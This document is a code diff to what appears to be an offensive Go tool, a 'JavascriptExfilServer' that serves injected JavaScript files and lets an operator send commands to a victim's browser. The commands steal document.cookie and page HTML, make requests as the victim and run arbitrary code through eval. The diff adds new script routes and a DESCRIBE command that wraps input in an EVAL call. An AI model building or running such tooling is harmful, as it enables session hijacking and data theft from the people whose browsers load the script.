@@ -31,6 +31,8 @@ func (js JavascriptExfilServer) GetServer(r *mux.Router, n *negroni.Negroni) (ht
 
 	n.UseHandler(r)
 
+	fmt.Printf("[+] Starting JSExfil server listening to : %s://%s:%s with an exfil URL at %s\n", js.Server.Scheme, js.GetCertSubject(), js.Server.Port, js.getExfilUrl())
+
 	server := http.Server{
 		Addr:    addr,
 		Handler: n,
@@ -53,6 +55,14 @@ func (js JavascriptExfilServer) CreateRouter() *mux.Router {
 
 	r.HandleFunc("/exfil.js", func(w http.ResponseWriter, r *http.Request) {
 		js.jSExfilHandler(w, r)
+	}).Methods("GET")
+
+	r.HandleFunc("/utils.js", func(w http.ResponseWriter, r *http.Request) {
+		js.jSUtilsHandler(w, r)
+	}).Methods("GET")
+
+	r.HandleFunc("/custom.js", func(w http.ResponseWriter, r *http.Request) {
+		js.jSCustomHandler(w, r)
 	}).Methods("GET")
 
 	r.HandleFunc("/exfil-input", func(w http.ResponseWriter, r *http.Request) {
@@ -78,6 +88,24 @@ func (js JavascriptExfilServer) indexHandler(w http.ResponseWriter, r *http.Requ
 	}
 
 	fmt.Fprintf(w, "%s\n", htmlCode)
+}
+
+func (js JavascriptExfilServer) jSUtilsHandler(w http.ResponseWriter, r *http.Request) {
+	jsCode, err := js.Box.FindString("utils.js")
+	if err != nil {
+		logger.Fatal(err)
+	}
+
+	fmt.Fprintf(w, "%s\n", jsCode)
+}
+
+func (js JavascriptExfilServer) jSCustomHandler(w http.ResponseWriter, r *http.Request) {
+	jsCode, err := js.Box.FindString("custom.js")
+	if err != nil {
+		logger.Fatal(err)
+	}
+
+	fmt.Fprintf(w, "%s\n", jsCode)
 }
 
 func (js JavascriptExfilServer) jSExfilHandler(w http.ResponseWriter, r *http.Request) {
@@ -135,12 +163,18 @@ func (js JavascriptExfilServer) jSExfilInputHandler(w http.ResponseWriter, r *ht
 			break
 		}
 
+		if strings.ToUpper(input[:8]) == "DESCRIBE" {
+			input = "EVAL walkTheObject(" + input[9:] + ")"
+			break
+		}
+
 		fmt.Printf("Unknown command\n")
 		fmt.Printf("[?] Help\n")
 		fmt.Printf("\tGET html - Retrieve the html source code of the page\n")
 		fmt.Printf("\tGET cookie - Retrieve the \"document.cookie\" value\n")
 		fmt.Printf("\tGET URI - Request the specific URI and retrieve response content\n")
 		fmt.Printf("\tGET URL - Request the specific URL and retrieve response content\n")
+		fmt.Printf("\tDESCRIBE object - Appply the \"walkTheObject\" function to the desired object\n")
 		fmt.Printf("\tEVAL cmd - Use the eval() function to evaluate content of cmd and retrieve output\n")
 	}
 
@@ -174,7 +208,7 @@ func (js JavascriptExfilServer) GetCertSubject() string {
 }
 
 func (js JavascriptExfilServer) CreateMiddleware() *negroni.Negroni {
-	n := js.Server.CreateMiddleware()
+	n := negroni.New(negroni.NewRecovery())
 
 	n.Use(&JSExfilLogMiddleware{
 		js: js,
